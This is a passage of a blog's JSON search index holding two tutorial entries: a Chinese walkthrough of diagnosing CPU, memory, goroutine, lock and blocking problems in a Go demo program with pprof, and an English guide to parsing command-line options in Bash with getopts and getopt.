graphviz，大多数系统上可以轻松安装它\nbrew install graphviz # for macos apt install graphviz # for ubuntu yum install graphviz # for centos 交互式终端里输入 web(虽然这个命令的名字叫\u0026quot;web\u0026quot;，但它的实际行为是产生一个 .svg 文件，并调用你的系统里设置的默认打开 .svg 的程序打开它) 输入 exit 退出 pprof 的交互式终端 排查内存占用过高\n内存的占用率仍然很高 go tool pprof http://localhost:6060/debug/pprof/heap 再一次使用 top, list 来定问问题代码 这次出问题的地方在 github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal 使用 web 来查看图形化展示，可以再次确认问题确实出在这里 排查频繁内存回收 GODEBUG=gctrace=1 ./go-pprof-practice | grep gc 接下来使用 pprof 排查时，我们在乎的不是什么地方在占用大量内存，而是什么地方在不停地申请内存，这两者是有区别的\ngo tool pprof http://localhost:6060/debug/pprof/allocs 可以看到 github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run 会进行无意义的内存申请 排查协程泄露 我们在浏览器里可以看到，此时程序的协程数已经多达 106 条 106 goroutine\ngo tool pprof http://localhost:6060/debug/pprof/goroutine 可能这次问题藏得比较隐晦，但仔细观察还是不难发现，问题在于 github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Drink 在不停地创建没有实际作用的协程 排查锁的争用\ngo tool pprof http://localhost:6060/debug/pprof/mutex 可以看出来这问题出在 github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Howl。但要知道，在代码中使用锁是无可非议的，并不是所有的锁都会被标记有问题，我们看看这个有问题的锁那儿触雷了。 排查阻塞操作\ngo tool pprof http://localhost:6060/debug/pprof/block 可以看到，阻塞操作位于 github.com/wolfogre/go-pprof-practice/animal/felidae/cat.(*Cat).Pee ","date":"June 22, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220622-go-ppof-practice/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.wolfogre.com/posts/go-ppof-practice/\" target=\"_blank\" rel=\"noopener\"\u003egolang pprof 实战\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/wolfogre/go-pprof-practice\" target=\"_blank\" rel=\"noopener\"\u003e炸弹程序\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 略\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;net/http/pprof\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e// 会自动注册 handler 到 http server，方便通过 http 接口获取程序运行采样报告\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 略\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 略\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eruntime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGOMAXPROCS\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 限制 CPU 使用数，避免过载\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eruntime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSetMutexProfileFraction\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 开启对锁调用的跟踪\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eruntime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSetBlockProfileRate\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 开启对阻塞操作的跟踪\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#75715e\"\u003e// 启动一个 http server，注意 pprof 相关的 handler 已经自动注册过了\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e// /debug/pprof/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eListenAndServe\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;:6060\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatal\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eos\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eExit\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 略\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003ehttp://localhost:6060/debug/pprof/\u003c/li\u003e\n\u003c/ul\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e类型\u003c/th\u003e\n          \u003cth\u003e描述\u003c/th\u003e\n          \u003cth\u003e备注\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eallocs\u003c/td\u003e\n          \u003ctd\u003e内存分配情况的采样信息\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，但可读性不高\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eblocks\u003c/td\u003e\n          \u003ctd\u003e阻塞操作情况的采样信息\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，但可读性不高\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ecmdline\u003c/td\u003e\n          \u003ctd\u003e显示程序启动命令及参数\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，这里会显示 ./go-pprof-practice\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003egoroutine\u003c/td\u003e\n          \u003ctd\u003e当前所有协程的堆栈信息\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，但可读性不高\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eheap\u003c/td\u003e\n          \u003ctd\u003e堆上内存使用情况的采样信息\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，但可读性不高\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003emutex\u003c/td\u003e\n          \u003ctd\u003e锁争用情况的采样信息\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，但可读性不高\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eprofile\u003c/td\u003e\n          \u003ctd\u003eCPU 占用情况的采样信息\u003c/td\u003e\n          \u003ctd\u003e浏览器打开会下载文件\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ethreadcreate\u003c/td\u003e\n          \u003ctd\u003e系统线程创建情况的采样信息\u003c/td\u003e\n          \u003ctd\u003e可以用浏览器打开，但可读性不高\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003etrace\u003c/td\u003e\n          \u003ctd\u003e程序运行跟踪信息\u003c/td\u003e\n          \u003ctd\u003e浏览器打开会下载文件，本文不涉及，可另行参阅《深入浅出 Go trace》\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e\u003cstrong\u003e排查 CPU 占用过高\u003c/strong\u003e\u003c/p\u003e","tags":["URL","Go","pprof"],"title":"golang pprof 实战"},{"categories":["URL","Linux","BASH"],"contents":" Parse Command Line Arguments in Bash getopts getopts optstring opt [arg ...]\n#!/bin/bash while getopts \u0026#39;abc:h\u0026#39; opt; do case \u0026#34;$opt\u0026#34; in a) echo \u0026#34;Processing option \u0026#39;a\u0026#39;\u0026#34; ;; b) echo \u0026#34;Processing option \u0026#39;b\u0026#39;\u0026#34; ;; c) arg=\u0026#34;$OPTARG\u0026#34; echo \u0026#34;Processing option \u0026#39;c\u0026#39; with \u0026#39;${OPTARG}\u0026#39; argument\u0026#34; ;; ?|h) echo \u0026#34;Usage: $(basename $0) [-a] [-b] [-c arg]\u0026#34; exit 1 ;; esac done shift \u0026#34;$(($OPTIND -1))\u0026#34; optstring represents the supported options. The option expects an argument if there is a colon (:) after it. For instance, if option c expects an argument, then it would be represented as c: in the optstring When an option has an associated argument, then getopts stores the argument as a string in the OPTARG shell variable. For instance, the argument passed to option c would be stored in the OPTARG variable. opt contains the parsed option. #!/bin/bash while getopts \u0026#39;:abc:h\u0026#39; opt; do case \u0026#34;$opt\u0026#34; in a) echo \u0026#34;Processing option \u0026#39;a\u0026#39;\u0026#34; ;; b) echo \u0026#34;Processing option \u0026#39;b\u0026#39;\u0026#34; ;; c) arg=\u0026#34;$OPTARG\u0026#34; echo \u0026#34;Processing option \u0026#39;c\u0026#39; with \u0026#39;${OPTARG}\u0026#39; argument\u0026#34; ;; h) echo \u0026#34;Usage: $(basename $0) [-a] [-b] [-c arg]\u0026#34; exit 0 ;; :) echo -e \u0026#34;option requires an argument.\\nUsage: $(basename $0) [-a] [-b] [-c arg]\u0026#34; exit 1 ;; ?) echo -e \u0026#34;Invalid command option.\\nUsage: $(basename $0) [-a] [-b] [-c arg]\u0026#34; exit 1 ;; esac done shift \u0026#34;$(($OPTIND -1))\u0026#34; Note that we\u0026rsquo;ve updated optstring as well. Now it starts with the colon(:) character, which suppresses the default error message. The getopts function disables error reporting when the OPTERR variable is set to zero. Parsing Long Command-Line Options With getopt #!/bin/bash VALID_ARGS=$(getopt -o abg:d: --long alpha,beta,gamma:,delta: -- \u0026#34;$@\u0026#34;) if [[ $? -ne 0 ]]; then exit 1; fi eval set -- \u0026#34;$VALID_ARGS\u0026#34; while [ : ]; do case \u0026#34;$1\u0026#34; in -a | --alpha) echo \u0026#34;Processing \u0026#39;alpha\u0026#39; option\u0026#34; shift ;; -b | --beta) echo \u0026#34;Processing \u0026#39;beta\u0026#39; option\u0026#34; shift ;; -g | --gamma) echo \u0026#34;Processing \u0026#39;gamma\u0026#39; option. Input argument is \u0026#39;$2\u0026#39;\u0026#34; shift 2 ;; -d | --delta) echo \u0026#34;Processing \u0026#39;delta\u0026#39; option. Input argument is \u0026#39;$2\u0026#39;\u0026#34; shift 2 ;; --) shift; break ;; esac done -o option represents the short command-line options --long option represents the long command-line options ","date":"June 7, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220607-bash-parse-command-line-arguments/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/bash-parse-command-line-arguments\" target=\"_blank\" rel=\"noopener\"\u003eParse Command Line Arguments in Bash\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"getopts\"\u003egetopts\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003egetopts optstring opt [arg ...]\u003c/code\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e getopts \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;abc:h\u0026#39;\u003c/span\u003e opt; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$opt\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e in\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    a\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing option \u0026#39;a\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    b\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing option \u0026#39;b\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    c\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      arg\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$OPTARG\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing option \u0026#39;c\u0026#39; with \u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eOPTARG\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39; argument\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ?|h\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Usage: \u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ebasename $0\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e [-a] [-b] [-c arg]\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      exit \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eesac\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshift \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$((\u003c/span\u003e$OPTIND \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e))\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eoptstring represents the supported options. The option expects an argument if there is a colon (:) after it. For instance, if option c expects an argument, then it would be represented as c: in the optstring\u003c/li\u003e\n\u003cli\u003eWhen an option has an associated argument, then getopts stores the argument as a string in the OPTARG shell variable. For instance, the argument passed to option c would be stored in the OPTARG variable.\u003c/li\u003e\n\u003cli\u003eopt contains the parsed option.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e getopts \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;:abc:h\u0026#39;\u003c/span\u003e opt; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$opt\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e in\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    a\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing option \u0026#39;a\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    b\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing option \u0026#39;b\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    c\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      arg\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$OPTARG\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing option \u0026#39;c\u0026#39; with \u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eOPTARG\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39; argument\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    h\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Usage: \u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ebasename $0\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e [-a] [-b] [-c arg]\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      exit \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    :\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;option requires an argument.\\nUsage: \u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ebasename $0\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e [-a] [-b] [-c arg]\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      exit \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ?\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Invalid command option.\\nUsage: \u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ebasename $0\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e [-a] [-b] [-c arg]\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      exit \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eesac\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshift \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$((\u003c/span\u003e$OPTIND \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e))\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eNote that we\u0026rsquo;ve updated optstring as well. Now it starts with the colon(:) character, which suppresses the default error message.\u003c/li\u003e\n\u003cli\u003eThe getopts function disables error reporting when the OPTERR variable is set to zero.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"parsing-long-command-line-options-with-getopt\"\u003eParsing Long Command-Line Options With getopt\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre 